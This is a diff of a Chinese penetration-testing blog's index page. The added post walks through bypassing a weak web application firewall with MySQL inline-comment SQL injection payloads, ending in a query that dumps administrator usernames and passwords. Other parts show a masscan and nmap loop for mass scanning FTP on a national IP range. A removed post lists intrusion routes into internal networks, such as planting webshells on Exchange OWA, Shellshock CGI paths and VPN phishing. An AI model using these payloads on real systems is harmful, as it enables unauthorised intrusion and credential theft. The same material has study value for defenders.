@@ -139,6 +139,52 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/20/bypass-waf-note/">
+                bypass waf入门之sql注入篇 [ 内联注释 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/bypasswaf/">bypasswaf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;昨天在搞一个目标的旁站时凑巧碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,招数早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:<br><br></p>
+<p>0x02 依旧是先判断注入点是否存在,很显然,’and’没有拦<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=1212  返回正常</div><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=121   返回异常,注入存在</div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"><br></p>
+<p>0x03 我们观察到,当字段个数为11的时候页面返回正常,说明当前表字段个数为11个,’order by’ 也没有拦,到这里为止,凭着一点经验自己心里就有种感觉,这个waf肯定非常好过,接着往下看吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 OrDer by 11</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test order by .png" alt="&#39;&#39;"><br></p>
+<p>0x04 开始搜集信息,这时我们发现waf似乎开始起作用了,拦了我们的内置函数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,user(),version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"><br></p>
+<p>0x05 既然拦了函数,咱们就把函数给注释一下看看,然后就这么容易的通过了[以为还要折腾很久],好吧,既然它对这种内联注释感冒,那后面我就把所有的关键字都用这种方式包起来,省的我一个个猜它到底拦哪个<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,/</span>*!user()*<span class="regexp">/,version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"><br></p>
+<p>0x06 查询当前库中的所有表,这类我们看到了’t_admin’这张管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 aNd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(table_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.tables*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_schema*<span class="regexp">/=0x686e797075686b315f7363686f6f6c --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"><br></p>
+<p>0x07 查询’t_admin’表中的所有字段名,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 ANd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(column_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.columns*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_name*<span class="regexp">/=0x745f61646d696e --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"><br></p>
+<p>0x08 就剩最后一步了,查出管理员的账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 anD 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!admin_name*<span class="regexp">/,/</span>*!admin_password*<span class="regexp">/,5,6,7,8,9,10,11 from /</span>*!t_admin*<span class="regexp">/ /</span>*!limit*<span class="regexp">/ 0,1--+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br><br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥实际技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续……<br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/05/18/sqlite3-common-injection/">
                 sql注入入门 之 sqlite3常规注入 [ union方式 ]
             </a>
@@ -1231,57 +1277,6 @@
 <p>0x11 如果你有兴趣,想针对某个国家网段进行大规模扫描也可以把它写成这样,当然,我这里是随便写的,你要想实际用肯定是远远不够的,单单只是提供个小demo,能自动化的事情还有很多,写个shell还是比较简单的,还是留给大家根据自己的实际需求自行发挥吧,反正工具就在那里,相互配合才能出效果,各自为战是很难有所作为的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></div><div class="line">while read LINE</div><div class="line">do</div><div class="line">   masscan -p 21 --rate=100 $LINE | tee -a 21.txt</div><div class="line">done &lt; hk_ip.txt</div><div class="line"><span class="meta"></span></div><div class="line"></div><div class="line">#<span class="bash"> tail -f 21.txt</span></div><div class="line"><span class="meta">#</span><span class="bash"> awk &#123;<span class="string">'print $6'</span>&#125; 21.txt &gt;&gt; result.txt</span></div><div class="line"><span class="meta">#</span><span class="bash"> nmap -p 21 -iL result.txt  -oN ftp_anonymous.txt  -v --script ftp-anon.nse</span></div></pre></td></tr></table></figure></p>
 <p><br></p>
 <p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于端口渗透,如果不是你自己写工具的情况下,其实本身使用上并没多少技术含量,至于无状态扫描的具体内部实现还是比较复杂的,至今为止,很多东西我自己也扔在学习中,如果大家真想深入去理解,非常建议自己直接拿着wireshark一边跑一边认真观察分析,没有什么比数据包更能说明问题,篇幅限制,这里我就不一一把每种扫描方式都带着大家跑一遍了,有些东西还是需要自己亲自尝试,不然,别人的东西永远都只是别的,端口这个东西,怎么说呢,有很多运气和经验敏感度的成分在里面,可能还要外加一个高质量的字典,另外,再多说一句,在没有十足的把握的情况下,直接在公网跑字典基本是不太靠谱的,实际测试中,对一些稍有防护的目标,爆破的成率还是蛮低的[虽然低,但往往非常有效,走投无路时不妨尝试],当然啦,对于端口,爆破只是很小的一个方面,比如,当我们发现某个工具或者系统服务存在远程溢出或者代码执行[不仅限于此类的可远程利用的漏洞,任何可以直接远程主动getshell的都可以],还是那句话,如果你手里有某个主流服务的通杀远程0day,不管是你自己挖的还是买的,也许只有这时才能体现端口扫描的真正价值,另外,还有多如牛毛的小工具,这里都没提到,后续涉及到内网时我们再仔细说明,对于公网扫描,有这些,暂时足矣,祝大家好运,切记不要干坏事就好!<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/18/inside-method/">
-                web渗透第一步之信息搜集  [ 找目标内网入口 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/dirscan-tools/">dirscan tools</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 为什么要找内网入口:<br>&nbsp;&nbsp;&nbsp;&nbsp;我们渗透的最终目的大多数都是目标内网,有些核心敏感数据(比如,个人机上的一些数据),我们从边界机器是拿不到的,所以,只能深入内部,当然,这里所指的内部文件数据,并不仅限于数据库,邮件这类数据,可能由于各种各样的需求,我们还需要某些个人的数据或者组织的各种业务数据,技术的各种数据等等,一般情况下,渗透web的目的,很大程度上也是希望能从web边界直接进入到目标内部(内网),对于apt来讲,价值比较高的东西基本也全部在内部,不得不承认的是,有时候公开信息调研确实也能找到部分敏感信息,但那个含金量和时效性就远远不如内网中的了,至于如何深入到目标内部,很大程度上也取决于,我们能不能尽可能多的找到目标可能的内网入口</p>
-<p>0x02 第一种,通过vpn进入目标内网[一般都会提供一个web端的443端口表单验证]:<br>&nbsp;&nbsp;&nbsp;&nbsp;vpn,想必大家都已经非常熟悉了,在前面也已经详细说明过它的用途,除了能帮我们翻墙当跳板之外,对于一些大型目标组织或是跨国公司,他们大部分都会选择利用vpn的方式来协作办公,通过vpn在公网上开辟一条专有通道,以方便公司内部的各种业务处理,但有个前提,你要想进入这条通道,必须有正确的vpn账号密码和vpn服务器地址,登陆成功后,才能处在目标的内网中,重点也就在这里,怎么搞到目标的vpn账号密码呢,嘿嘿……方法比较多,例如,发信钓鱼,搜集目标泄露过的各种配置文件,社工撞库……</p>
-<p>0x03 利用各类邮件程序自身的漏洞尝试从web边界进入目标内网<br>&nbsp;&nbsp;&nbsp;&nbsp;下面就简单介绍一种常见的web邮件程序,[这里为什么一定要是邮件程序呢,不同于普通的web网站,普通的web服务器有时候即使拿到shell,但有可能机器并不在内网或者该机器上根本没有内网网卡,但邮件服务器一般都被会用来处理内部实际业务,从个人经验来看,web邮件程序的机器,绝大部分都在内网]:</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;owa 微软自家的exchange服务,企业为了便于统一协作管理,一般都会直接把exchange服务部署在域内,邮箱名称和邮箱密码大部分也直接是域内的系统账号密码,可以直接拿来登陆域内系统,当然,vpn也是可以尝试的,关键还是看目标具体是怎么部署的了,至于,如何搞到目标的owa的账号密码,嘿嘿……后面再总结吧,包括命令行邮件导出成pst文件,如果目标部署的有exchange server 一般直接访问下/owa/auth即可看到,服务被部署好以后管理员没有特殊情况基本就不怎么会关注/owa/auth目录下的文件了,所以当你拿到权限后,在这儿放个webshell,还是很靠谱的,一般都是web的443端口,另外,对于owa本身几乎是没什么漏洞的</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">owa的一般入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/remote.bmtjfa.com.au/owa</span><span class="regexp">/auth/logon</span>.aspx机器在域内的情况</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.advancedptsm.com/owa</span><span class="regexp">/auth/logon</span>.aspx机器不在域内的情况</div><div class="line"></div><div class="line">如果没有删的话,可以访问下面的路径爆出服务器信息:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com/owa</span><span class="regexp">/auth/test</span>.aspx</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Mirapoint邮件系统:</div><div class="line">ShellShock漏洞,漏洞地址如下:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/search.cgi</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/madmin.cgi</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">KerioConnect 邮件系统:</div><div class="line">一般后台只能内网访问,入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com:4040/admin</span><span class="regexp">/login/</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Zimbra 邮件系统: </div><div class="line">本地包含,入口:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com:7071/zimbra</span>Admin/</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">查看zimbra版本:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com/help</span><span class="regexp">/zh_CN/standard</span><span class="regexp">/version.htm</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Atmail 邮件系统: </div><div class="line">敏感信息泄露问题[数据库账号密码]:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.xxx.com/config</span><span class="regexp">/dbconfig.ini</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Lotus Domino <span class="symbol">Webmail:</span></div><div class="line">越权访问,<span class="symbol">inurl:</span>.nsf/WebHelp/!OpenPage</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TurboMail邮件系统: </div><div class="line">默认配置不当可进入任意邮箱,默认有四个root域账号,一个管理员,三个普通用户</div><div class="line">由于设置缺陷,导致普通用户可以查看任意用户的密码</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">U-<span class="symbol">mail:</span></div><div class="line">sql注入,可写shell</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">WinMail:</span></div><div class="line">非授权访问/权限绕过</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ExtMail :</div><div class="line">老版本注入</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SquirrelMail</div></pre></td></tr></table></figure>
-<p>0x04 找目标的oa系统或者图书馆之类的网站以及各种边界网络设备的web管理端[一般像这些东西跟内网的联系比较大]:<br>&nbsp;&nbsp;&nbsp;&nbsp;oa本来就是为了方便员工远程办公,处理公司各种业务用的,但,这也给我们提供了通往目标内部的入口至于,为什么非要选则图书馆,目的很显然,既然是图书馆,你肯定会想到内部的什么图书管理系统,实际经验也证明,大多数图书馆的站,都会处在内网中找各种网络设备的web管理端,主要是想登进去以后,看看有没有可以上传shell的地方,也许可以利用得到</p>
-<p>0x05 在你能力足够的情况下,直接搞路由也是可以的[比如,cisco,端口镜像,抓包分析,说实话自己对路由并不是非常擅长]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">路由作为一种边界设备,搞它的意义就不用再多说了吧</div></pre></td></tr></table></figure></p>
-<p>0x06 暴露在边界的目标打印机,智能点儿的打印机都会自带一些web服务[通常是java]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">打印机,就更不用说了,典型的内部设备,一般是先找到配置管理界面,部署war包</div></pre></td></tr></table></figure></p>
-<p>0x07 如果实在外部搞不定,条件允许的情况下,尝试实地渗透也是可以的,比如,通过无线进入目标内部<br>&nbsp;&nbsp;&nbsp;&nbsp;这也算是一种相对比较高效的渗透方式,老外非常干这个,但前提是,你可能需要很多次的蹲点,才能确认目标,实地渗透对你的心里素质要求可能会更高一些,另外,现场的环境和有限的时间也多多少少会影响到你<br><br></p>
-<p>一些小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;时间原因,暂时就想到这些,都是一些平时的经验加上一点自己的想法,其实,就整个信息搜集来讲,对你的社工能力其实是个不小的考验,我自己在这方面确实是弱项,后续会慢慢加强<br><br></p>
 
         </div>
     
